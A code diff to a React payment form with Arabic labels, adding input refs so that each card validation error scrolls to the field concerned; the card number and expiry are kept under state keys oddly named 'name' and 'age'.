@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import { motion, AnimatePresence } from "framer-motion";
@@ -28,6 +28,10 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const [countdown, setCountdown] = useState("");
   const [serverBlocked, setServerBlocked] = useState(false);
   const [serverBlockedUntil, setServerBlockedUntil] = useState(0);
+  const cardRef = useRef<HTMLInputElement>(null);
+  const expiryRef = useRef<HTMLInputElement>(null);
+  const cvvRef = useRef<HTMLInputElement>(null);
+  const holderRef = useRef<HTMLInputElement>(null);
 
   const formatTime = useCallback((ms: number) => {
     const m = Math.floor(ms / 60000);
@@ -84,22 +88,24 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     const { blocked, remainingMs } = getRateLimitStatus();
     if (blocked) { setRateLimitMsg("عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً 🙏"); setCountdown(formatTime(remainingMs)); return; }
     const rawCard = fields.name.replace(/\s/g, "");
-    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
-    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
-    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
-    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); return; }
+    const scrollToError = (ref: React.RefObject<HTMLInputElement | null>) =>
+      ref.current?.scrollIntoView({ behavior: "smooth", block: "center" });
+    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); scrollToError(!fields.name ? cardRef : !fields.age ? expiryRef : !fields.cvv ? cvvRef : holderRef); return; }
+    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); scrollToError(cardRef); return; }
+    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); scrollToError(cardRef); return; }
+    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); scrollToError(cardRef); return; }
     setCardError("");
-    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
+    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); scrollToError(cvvRef); return; }
     setCvvError("");
     const parts = fields.age.split("/");
     const expMonth = Number(parts[0]), expYear = Number(parts[1]);
     const now = new Date();
-    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) { setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY"); return; }
-    if (expMonth < 1 || expMonth > 12) { setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12"); return; }
+    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) { setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY"); scrollToError(expiryRef); return; }
+    if (expMonth < 1 || expMonth > 12) { setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12"); scrollToError(expiryRef); return; }
     const cardDate = new Date(2000 + expYear, expMonth - 1, 1);
     const currentMonth = new Date(now.getFullYear(), now.getMonth(), 1);
-    if (cardDate < currentMonth) { setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي"); return; }
-    if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح"); return; }
+    if (cardDate < currentMonth) { setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي"); scrollToError(expiryRef); return; }
+    if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح"); scrollToError(expiryRef); return; }
     setExpiryError("");
     setLoading(true);
     try {
@@ -218,6 +224,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
             <div className="relative">
               <input
                 autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19} dir="ltr" style={{ textAlign: "right" }}
+                ref={cardRef}
                 value={fields.name}
                 onChange={e => {
                   let v = e.target.value.replace(/\D/g, "").slice(0, 16);
@@ -251,6 +258,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
               <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">تاريخ الانتهاء</label>
               <input
                 autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
+                ref={expiryRef}
                 value={fields.age}
                 onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
                 className={inputClass("age", expiryError)}
@@ -261,6 +269,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
               <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">رمز CVV</label>
               <input
                 autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
+                ref={cvvRef}
                 value={fields.cvv}
                 onFocus={() => setFlipped(true)}
                 onBlur={() => setFlipped(false)}
@@ -276,6 +285,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
             <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">اسم حامل البطاقة</label>
             <input
               autoComplete="cc-name" type="text" placeholder="FULL NAME"
+              ref={holderRef}
               value={fields.cardHolder}
               onChange={e => { const v = e.target.value.replace(/[^a-zA-Z ]/g, ""); setFields(f => ({ ...f, cardHolder: v.toUpperCase() })); }}
               className={inputClass("cardHolder")}
